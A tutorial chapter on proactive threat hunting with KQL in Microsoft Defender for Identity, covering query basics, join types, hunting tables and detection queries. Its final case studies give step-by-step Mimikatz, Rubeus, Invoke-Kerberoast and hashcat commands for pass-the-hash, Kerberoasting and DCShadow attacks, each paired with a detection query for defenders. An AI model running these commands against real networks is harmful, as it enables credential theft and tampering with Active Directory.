# Chapter 5 - Proactive Threat Hunting with KQL

To learn more about KQL, visit (Kusto Detective Agency)[https://detective.kusto.io].

## Table of Contents

- [Getting Started with KQL](#getting-started-with-kql)
- [Exploring Data with KQL](#exploring-data-with-kql)
- [Defining new columns](#defining-new-columns)
- [Renaming columns](#renaming-columns)
- [Filtering and Sorting Data](#filtering-and-sorting-data)
- [Combining Multiple Tables](#combining-multiple-tables)
    - [Explanation of Left and Right Tables in KQL Joins](#explanation-of-left-and-right-tables-in-kql-joins)
    - [Exploring Join Types](#exploring-join-types)
        - [Inner Join](#inner-join)
        - [Leftouter Join](#leftouter-join)
        - [Rightouter Join](#rightouter-join)
        - [Fullouter Join](#fullouter-join)
        - [Innerunique Join](#innerunique-join)
        - [Leftanti Join](#leftanti-join)
        - [Rightanti Join](#rightanti-join)
        - [Leftsemi Join](#leftsemi-join)
        - [Rightsemi Join](#rightsemi-join)
    - [Example 1](#example-1)
    - [Example 2](#example-2)
- [Group and Combine Data](#group-and-combine-data)
- [Hunting Tables in MDI](#hunting-tables-in-mdi)
    - [IdentityLogonEvents](#identitylogonevents)
    - [IdentityDirectoryEvents](#identitydirectoryevents)
    - [IdentityInfo](#identityinfo)
    - [DeviceLogonEvents](#devicelogonevents)
    - [IdentityQueryEvents](#identityqueryevents)
- [Advanced KQL Techniques for Deep Threat Detection](#advanced-kql-techniques-for-deep-threat-detection)
    - [Identifying NTLM and Kerberos Sign-ins](#identifying-ntlm-and-kerberos-sign-ins)
    - [Monitoring Legacy Service Accounts](#monitoring-legacy-service-accounts)
    - [Identifying All Service Accounts](#identifying-all-service-accounts)
    - [Monitoring Multiple Service Accounts](#monitoring-multiple-service-accounts)
    - [Ensuring Domain Controllers Are Not Used as File Servers](#ensuring-domain-controllers-are-not-used-as-file-servers)
    - [Detecting Enumeration Attacks](#detecting-enumeration-attacks)
- [Real-World Case Studies: Detecting Advanced Attacks with KQL](#real-world-case-studies-detecting-advanced-attacks-with-kql)
    - [Pass-the-hash (PtH) Attacks](#pass-the-hash-pth-attacks)
        - [Steps to perform a PtH attack](#steps-to-perform-a-pth-attack)
        - [Detection](#detection)
    - [Kerberosting](#kerberosting)
        - [Steps to perform Kerberoasting](#steps-to-perform-kerberoasting)
        - [Detection](#detection-1)
    - [DCShadow Attack](#dcshadow-attack)
        - [Steps to perform DCShadow attack](#steps-to-perform-dcshadow-attack)
        - [Detection](#detection-2)

## Getting Started with KQL

Suppose you want to retrieve all logon events that were successful in the last 24 hours. Here’s how you can write that query: 
```kql
IdentityLogonEvents 
| where Timestamp >= ago(24h) 
| where ActionType == "LogonSuccess"
```

### Exploring Data with KQL

Once you’re comfortable with basic queries, you can start exploring your data more deeply. One thing I personally tend to do is always look at the table and grab the first rows to see what type of columns and information the table consumes. To do this I’m using the take operator, see the following query: 

```kql
IdentityLogonEvents
| take 5
```

```kql
IdentityLogonEvents
| project Timestamp, ActionType, Application, DestinationPort
| take 5
```

### Defining new columns
```kql
IdentityLogonEvents
| extend SessionDurationMinutes = (LogoffTime - LogonTime) / 1m
```

### Renaming columns
```kql
SecurityEvent
| project-rename EventTime = Timestamp, MachineName = Computer
```

### Filtering and Sorting Data
SecurityAlert 

| where Timestamp >= ago(24h) 

| where Severity == “High” 

| where User == “JohnDoe” 

Sorting the results can also be helpful. To sort these high severity alerts by their generation time, you can use the sort operator: 

SecurityAlert 

| where Timestamp >= ago(24h) 

| where Severity == “High” 

| where User == “JohnDoe” 

| sort by Timestamp desc 

### Combining Multiple Tables

Table1 

| join kind=JoinType (Table2) on KeyColumn 

#### Explanation of Left and Right Tables in KQL Joins

IdentityLogonEvents 

| where TimeGenerated >= ago(24h) 

| join kind=inner ( 

    SecurityAlert 

    | where TimeGenerated >= ago(24h) 

    | where Severity == “High” 

) on $left.User == $right.User 

| project $left.TimeGenerated, $left.User, $left.LogonType, $right.AlertName, $right.Severity, $right.Description



#### Exploring Join Types

**Inner Join**
```kql
Table1 
| join kind=inner (Table2) on KeyColumn
```

**Leftouter Join**
```kql
Table1 
| join kind=leftouter (Table2) on KeyColumn 
```

**Rightouter Join**
```kql
Table1 
| join kind=rightouter (Table2) on KeyColumn
```

**Fullouter Join**
```kql
Table1
| join kind=fullouter (Table2) on KeyColumn
```

**Innerunique Join** *Default join mode*
```kql
Table1
| join kind=innerunique (Table2) on KeyColumn 
```

**Leftanti Join**
```kql
Table1
| join kind=leftanti (Table2) on KeyColumn
```

**Rightanti Join**
```kql
Table1 
| join kind=rightanti (Table2) on KeyColumn
```

**Leftsemi Join**
```kql
Table1 
| join kind=leftsemi (Table2) on KeyColumn
```

**Rightsemi Join**
```kql
Table1 
| join kind=rightsemi (Table2) on KeyColumn
```

##### Example 1
Example Scenario 

Let’s say we want to find users who have logon events but no corresponding security alerts within the last 24 hours. We will use a `leftanti` join to achieve this. 

```kql
IdentityLogonEvents
| where TimeGenerated >= ago(24h)
| join kind=leftanti (
    SecurityAlert
    | where TimeGenerated >= ago(24h)
) on $left.User == $right.User
```

The following list explains the various terms in the preceding code: 

- `IdentityLogonEvents`: The table containing logon event data. 
- `SecurityAlert`: The table containing security alert data. 
- `leftanti`: This join type returns rows from IdentityLogonEvents where there is no matching `User` in SecurityAlert. 
- `on $left.User == $right.User`: The key column to join on, which is `User` in both tables. 

##### Example 2
We want to find all logon events within the last 24 hours and then join them with high-severity security alerts. This way, we can focus on the most critical incidents that require immediate attention. We will use the `IdentityLogonEvents` table together with the `SecurityAlert` table to find the most critical logon events. We will use an inner join to include only the records that have matching entries in both tables. 

```kql
IdentityLogonEvents
| where TimeGenerated >= ago(24h)
| join kind=inner (
    SecurityAlert
    | where TimeGenerated >= ago(24h)
    | where Severity == "High"
) on $left.User == $right.User
```

Imagine your security team receives numerous alerts daily, but you want to prioritize investigating the most severe incidents. By running this query, you can: 

- Identify Critical Logon Events: Quickly see which user logons are associated with high-severity alerts, indicating potentially serious security threats 
- Focus on Severity: Filter out less critical alerts and focus on those that require immediate action 
- Gain Context: Understand the context around high-severity alerts by viewing related logon events, which can help in assessing the scope and impact of the incident 

### Group and Combine Data
```kql
IdentityLogonEvents
| where Timestamp >= ago(24h)
| summarize TotalLogins = count() by LogonType
```

## Hunting Tables in MDI

### IdentityLogonEvents

### IdentityDirectoryEvents

This table is valuable for auditing changes to directory services and identifying potential insider threats or configuration issues. 

Start by looking at what type of `ActionType` you have with the `summarize` operator and the `count()` aggregation function to count the records per summarization group. 

```kql
IdentityDirectoryEvents
| where Timestamp > ago(7d)
| summarize count() by ActionType
```

The following is a query that will list changes to a specific group (you will now be presented with the `let` statement, which helps us to set a variable name, and, in this scenario, the variable name will be group). 

```kql
let group = '<insert your group>';
IdentityDirectoryEvents
| where ActionType == 'Group Membership changed'
| extend AddedToGroup = AdditionalFields['TO.GROUP]
| extend RemovedFromGroup = AdditionalFields['FROM.GROUP']
| extend TargetAccount = AdditionalFields['TARGET_OBJECT.USER']
| where AddedToGroup == group or RemovedFromGroup == group
| project-reorder Timestamp, ActionType, AddedToGroup, RemovedFromGroup, TargetAccount
| limit 100
```

As you can see the `AdditionalFields` column has some very informative data for us when we are hunting. 

### IdentityInfo
The following is a query that will filter and summarize from the `IdentityInfo` table based on the name of a specific department. 

```kql
let DepartmentName = '<insert your department>';
IdentityInfo
| where Department == DepartmentName
| summarize by AccountObjectId, AccountUpn
```

We start off by assigning a new variable called `DepartmentName` with the `let` statement. We then filter the rows with the `where` operator to match the name of the department in the `Department` column, and finally we are summarizing the rows with the `summarize` operator by `AccountObjectId` and `AccountUpn`. 

In the next query we will hunt to see if any user has accessed a specific server and if that user was not part of the IT department. 

```kql
let LoginEvent = dynamic([“4624”,”4672”,”4768”,”4776”]);
SecurityEvent
| where EventID in (LoginEvent)
| where Computer == “ADFS01.contoso.local”
| join kind=innerunique (
    IdentityInfo
    | summarize arg_max(TimeGenerated, *) by AccountObjectId
    ) on $left.TargetUserSid == $right.AccountSID 
| where Department != "IT"
```

At the top of the query, we will yet again start off by initiating a new variable with the let statement, and now we will have a dynamic list of event Id’s that will be used in the where operator for the SecurityEvent table (which contains security events from Windows machines). We will do another filtering with the where operator to target a specific server and in this case, we are looking at the ADFS01 server. Next, we will join the SecurityEvent table with the IdentityInfo table, and the join type is innerunique, ensures that each matching AccountObjectId from IdentityInfo is linked with the corresponding TargetUserSid from the SecurityEvent table. The arg_max function ensures that only the most recent entry for each user is considered. The final filter removes users belonging to the IT department from the results, focusing the analysis on users from other departments. 

### DeviceLogonEvents
The following query will hunt for logons that occurred right after malicious email was received, and to be able to make that query we need to correlate with the `EmailEvents` table. This can help in investigating potential security incidents where a malicious email might have led to unauthorized access or other suspicious activities. 

```kql
let MaliciousEmail=EmailEvents
| where ThreatTypes has "Malware"
| project TimeEmail = Timestamp, Subject, SenderFromAddress, AccountName = tostring(split(RecipientEmailAddress, “@”)[0]);
MaliciousEmail
| join (
DeviceLogonEvents
| project LogonTime = Timestamp, AccountName, DeviceName
) on AccountName
| where (LogonTime - TimeEmail) between (0min .. 30min)
| take 10
```

### IdentityQueryEvents
Below query is designed to identify and analyze potential AS-REP Roasting attacks targeting the “Domain Admins” group. AS-REP Roasting is a technique used by attackers to obtain Ticket Granting Tickets (TGTs) for user accounts that have the “Do not require Kerberos preauthentication” attribute set (on the user properties and under the Account tab). This query focuses on identifying such attempts within the last 24 hours. 

```kql
IdentityQueryEvents
| where Timestamp > ago(1d)
| where QueryTarget == "Domain Admins"
| where Query contains "attribute"
```

## Advanced KQL Techniques for Deep Threat Detection
### Identifying NTLM and Kerberos Sign-ins

```kql
IdentityLogonEvents
| where Application == "Active Directory"
| where Protocol in ("Ntlm", "Kerberos")
| where ActionType == "LogonSuccess"
| summarize count() by Protocol
| render piechart
```

### Monitoring Legacy Service Accounts
```kql
IdentityLogonEvents
| where Application == "Active Directory"
| where AccountUpn == "your_svcaccount@domain.local" // Edit to your SVC account
| where ActionType == "LogonSuccess"
| summarize count() by DeviceName
```

### Identifying All Service Accounts
```kql
IdentityInfo
| where SourceProvider == "ActiveDirectory"
| where Type == "ServiceAccount"
| summarize arg_max(AccountName,*) by Timestamp
| sort by Timestamp desc
```

### Monitoring Multiple Service Accounts
```kql
let srvcList = dynamic(["svc1@contoso.local","svc2@contoso.local","svc3@contoso.local"]);
IdentityLogonEvents
| where AccountUpn in~ (srvcList)
| summarize count() by AccountName, DeviceName, Protocol
```

### Ensuring Domain Controllers Are Not Used as File Servers
```kql
IdentityDirectoryEvents
| where ActionType == "SMB file copy"
| extend ParsedFields=parse_json(AdditionalFields)
| extend FileName=tostring(ParsedFields.FileName), FilePath=tostring(ParsedFields.FilePath), Method=tostring(ParsedFields.Method)
| where Method == "Write"
| project Timestamp, ActionType, DeviceName, IPAddress, AccountDisplayName, DestinationDeviceName, DestinationPort, FileName, FilePath, Method
```

### Detecting Enumeration Attacks
```kql
IdentityQueryEvents
| where Application == "Active Directory"
| where ActionType in ("SAMR", "LDAP")
| project Timestamp, ActionType, DeviceName, DestinationDeviceName, AccountDisplayName, QueryType, QueryTarget
```

## Real-World Case Studies: Detecting Advanced Attacks with KQL

### Pass-the-hash (PtH) Attacks

#### Steps to perform a PtH attack 

The following steps will guide you through executing a PtH attack, which involves obtaining and using hashed credentials to authenticate within a network without needing plaintext passwords: 

1. Obtain NTLM Hashes 
    - On a compromised machine, run Mimikatz to extract NTLM hashes
    - Execute the following commands in Mimikatz
    ```cmd
    privilege::debug 
    sekurlsa::logonpasswords 
    ```
    - Note the NTLM hash of a user account 
2. Use NTLM Hash to Authenticate 
    - Use the NTLM hash to authenticate to another machine in the network using Mimikatz 
    ```cmd
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash>
    ```
3. Verify Access 
    - A new command prompt opens with the privileges of the target user. Try accessing network resources to verify the attack 

#### Detection 

```kql
DeviceEvents
| extend AdditionalFieldsParsed = parse_json(AdditionalFields)
| extend Description = tostring(AdditionalFieldsParsed.Description)
| where Description has "sekurlsa::pth"
| project-reorder Timestamp, Description, InitiatingProcessFolderPath, InitiatingProcessAccountName
```

### Kerberosting

#### Steps to perform Kerberoasting 

The following steps will demonstrate how to carry out a Kerberoasting attack, which involves requesting service tickets for service accounts and attempting to crack them offline to reveal plaintext passwords:  

1. Enumerate Service Accounts with SPNs (Service Principal Names) 
    - Use PowerShell to list service accounts with SPNs 
    ```powershell
    Get-ADUser -Filter {ServicePrincipalName -ne “$null”} -Properties ServicePrincipalName | Select-Object SamAccountName, ServicePrincipalName
    ```
2. Request service tickets (TGS) for these SPNs 
    - Use `Rubeus` or `Invoke-Kerberoast` to request service tickets 
    ```powershell
    Invoke-Kerberoast -OutputFormat Hashcat
    Rubeus.exe kerberoast
    ```
3. Extract and Crack Tickets 
    - Extract the tickets and save them to a file 
    - Use a cracking tool like Hashcat to crack the hashes 
    ```cmd
    hashcat -m 13100 -a 0 <hash_file> <wordlist>
    ```

#### Detection
```kql
SecurityEvent
| where EventID == 4769
| where AccountName !endswith "$" // Filter out service or machine accounts
| where ServiceName !endswith "$" // Filter out service accounts
| where TicketEncryptionType == "0x17" // Focus on tickets using RC4 encryption
| project TimeGenerated, AccountName, ServiceName, ClientAddress, TicketEncryptionType
```

### DCShadow Attack

#### Steps to perform DCShadow attack 

The following steps outline the process of performing a DCShadow attack, where an attacker registers a rogue domain controller and pushes malicious changes into the Active Directory through the replication process: 

1. Switch to `SYSTEM`
    - Run the following commands in Mimikatz. You will see in the output that you are running in `SYSTEM` context 
        ```cmd
        privilege::debug 
        token::elevate
        ``` 
2. List all tokens and find the Domain Admin account’s token ID 
    - Start listing all tokens and remember the ID of a Domain Admin account, we will use that ID later 
        ```cmd
        token::list 
        ```
3. Register a Rogue DC using Mimikatz 
    - Use Mimikatz to register a rogue change in AD, in the example below we are changing the description of the object in AD 
    ```cmd
    lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=domain,DC=com /attribute:description /value:"DCShadow Test" 
    ```
4. Push Malicious Changes to AD 
    - Pushing the changes to AD requires a replication, therefore we need to open a new Mimikatz command prompt as our compromised Domain Admin account. For example, push the description changes that we did earlier 
    ```cmd
    lsadump::dcshadow /push
    ```

#### Detection
```kql
let startDateTime = ago(1d);
let endDateTime = now();
SecurityEvent
| where TimeGenerated between (startDateTime .. endDateTime)
| where EventID in (4742, 4662, 4929, 4931)
| where AccountName !contains "$" // Filtering out service accounts generally
| extend ObjectModified = tostring(TargetObject)
| where ObjectModified contains "CN=Domain Controllers"
| project TimeGenerated, EventID, AccountName, ComputerName, ObjectModified, Activity
| distinct TimeGenerated, AccountName, ComputerName, ObjectModified, EventID, Activity
```